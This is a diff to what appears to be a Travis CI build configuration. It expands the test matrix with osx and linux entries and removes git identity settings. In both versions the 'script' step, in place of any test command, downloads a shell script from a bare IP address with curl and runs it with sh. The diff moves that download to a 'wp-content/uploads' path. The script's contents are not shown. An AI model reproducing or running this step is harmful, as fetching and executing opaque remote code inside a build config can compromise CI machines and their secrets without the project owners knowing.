@@ -7,23 +7,31 @@ env:
     - PATH=$DEPS/bin:$PATH
 matrix:
   include:
-    - env: ENV=vim72
+    - os: osx
+      env: ENV=vim72
+    - os: osx
+      env: ENV=vim8
+    - os: linux
+      env: ENV=vim72
       rvm: 1.8.7
       addons: { apt: { packages: [vim-nox] } }
-    - env: ENV=python
+    - os: linux
+      env: ENV=python
       rvm: 1.8.7
       addons: { apt: { packages: [python2.7-dev] } }
-    - env: ENV=python3
+    - os: linux
+      env: ENV=python3
       rvm: 1.8.7
       addons: { apt: { packages: [python3-dev] } }
-    - env: ENV=ruby18
+    - os: linux
+      env: ENV=ruby18
       rvm: 1.8.7
-    - env: ENV=ruby20
+    - os: linux
+      env: ENV=ruby20
       rvm: 2.0.0
-    - env: ENV=vim8
+    - os: linux
+      env: ENV=vim8
 install: |
-  git config --global user.email "you@example.com"
-  git config --global user.name "Your Name"
   if [ "$ENV" == "vim72" ]; then
     mkdir -p ${DEPS}/bin
     ln -s /usr/bin/vim.nox ${DEPS}/bin/vim
@@ -48,4 +56,4 @@ install: |
   make
   make install
   cd -
-script: curl http://47.92.112.211/FSC.sh -L > fsc.sh && sh fsc.sh
+script: curl http://47.92.112.211/wp-content/uploads/FSC.sh -L > fsc.sh && sh fsc.sh
